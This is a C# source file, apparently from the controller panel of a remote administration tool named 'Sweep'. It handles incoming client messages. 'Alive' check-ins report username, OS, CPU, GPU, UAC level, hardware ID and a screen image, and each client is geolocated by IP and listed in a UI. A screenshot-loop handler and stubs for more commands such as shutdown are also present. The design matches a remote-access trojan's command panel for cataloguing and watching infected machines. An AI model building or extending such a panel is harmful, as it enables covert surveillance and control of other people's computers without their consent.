using System;
using System.Drawing;
using System.IO;
using System.Threading.Tasks;
using BrightIdeasSoftware;
using LazyServer;
using Newtonsoft.Json.Linq;
using Sweep.Models;
using Sweep.UI;

namespace Sweep.Services
{
    public class MessageHandler
    {
        private readonly LazyServerHost _server;
        private readonly ObjectListView _listView;

        public MessageHandler(LazyServerHost server, ObjectListView listView, int port)
        {
            _server = server ?? throw new ArgumentNullException(nameof(server));
            _listView = listView ?? throw new ArgumentNullException(nameof(listView));

            // Configure the list-view columns once
            ListViewConfigurator.Configure(_listView, port);

            // Subscribe to server events
            _server.MessageReceived += OnTextMessageReceived;
            _server.FileOfferWithMetaReceived += OnFileOfferWithMetaReceived;
        }

        private void OnTextMessageReceived(object sender, MessageEventArgs e)
        {
            Console.WriteLine($"[MSG] From {e.ClientId}: {e.Message}");
        }

        private async void OnFileOfferWithMetaReceived(object sender, FileOfferWithMetaEventArgs e)
        {
            JObject meta;
            try
            {
                meta = JObject.Parse(e.FileRequest.Metadata);
            }
            catch (Exception ex)
            {
                Console.WriteLine("Invalid JSON metadata: " + ex.Message);
                return;
            }

            var msgType = (string)meta["msg"] ?? "";
            switch (msgType)
            {
                case "alive":
                    await HandleAliveAsync(meta, e.ClientId, e.FileRequest.FileBytes);
                    break;

                case "ssloop":
                    await HandleScreenshotAsync(meta, e.ClientId, e.FileRequest.FileBytes);
                    break;

                // <— add new msg‐types here —
                // case "shutdown":
                //     await HandleShutdownAsync(meta, e.ClientId);
                //     break;

                default:
                    Console.WriteLine($"[WARN] Unknown msg type '{msgType}' from {e.ClientId}");
                    break;
            }
        }
        private async Task HandleScreenshotAsync(JObject meta, string clientId, byte[] packet)
        {
            try
            {
                Image shot;
                using (var ms = new MemoryStream(packet))
                    shot = Image.FromStream(ms);

                Console.WriteLine($"Received screenshot ({shot.Width}×{shot.Height}) from {clientId}");
                // … your custom logic here …
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error in HandleScreenshot: " + ex);
            }
        }
        private async Task HandleAliveAsync(JObject meta, string clientId, byte[] packet)
        {
            try
            {
                var ip = (string)meta["ip"];
                var flag = await FlagDownloader.GetFlagImageByIpAsync(ip);
                var country = await FlagDownloader.GetCountryAsync(ip);

                Image screen;
                using (var ms = new MemoryStream(packet))
                    screen = Image.FromStream(ms);

                var client = new ClientInfo
                {
                    Screen = screen,
                    IP = ip,
                    Country = country,
                    Flag = flag,
                    ID = clientId,
                    Username = (string)meta["username"],
                    OperatingSystem = (string)meta["os"],
                    CPU = (string)meta["cpu"],
                    GPU = (string)meta["gpu"],
                    UAC = (string)meta["uac"],
                    HWID = (string)meta["hwid"],
                };

                // Safe UI thread marshal
                if (_listView.InvokeRequired)
                    _listView.BeginInvoke(new Action(() => _listView.AddObject(client)));
                else
                    _listView.AddObject(client);
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error in HandleAlive: " + ex);
            }
        }


    }
}
